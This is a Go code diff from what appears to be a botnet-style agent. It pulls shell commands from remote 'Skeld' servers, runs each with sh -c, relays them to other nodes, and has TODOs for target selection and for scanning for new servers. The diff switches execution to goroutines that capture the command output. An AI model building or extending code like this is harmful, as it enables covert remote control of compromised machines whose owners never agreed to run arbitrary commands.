@@ -38,12 +38,21 @@ func getConfig(server string) (interop.Config, error) {
 
 func run() { // TODO add targeting logic?
 	for c := range runStream {
-		exec.Command("sh", "-c", c).Start()
+		// fmt.Print(c)
+		go func() {
+			fmt.Println("Command Received!")
+			out, err := exec.Command("sh", "-c", c).Output()
+			if err != nil {
+				fmt.Printf("Error: %s", err)
+			}
+			fmt.Println(string(out))
+		}()
 	}
 }
 
 func scan() { // remember to Lock() when updating the config
 	// TODO scan for new servers
+
 }
 
 func main() {
@@ -64,13 +73,6 @@ func main() {
 	go skserver.Fetch(&config, &mu, &pullStream)
 	go scan()
 
-	go func() {
-		for c := range pullStream {
-			runStream <- c
-			pushStream <- c
-		}
-	}()
-
 	if relay {
 		go skserver.Serve(&pushStream)
 	} else {
@@ -79,6 +81,10 @@ func main() {
 
 			}
 		}()
+	}
+	for c := range pullStream {
+		runStream <- c
+		pushStream <- c
 	}
 
 	//Poll Skeld servers to make sure MIN(num_servers, 3) are known and functional.
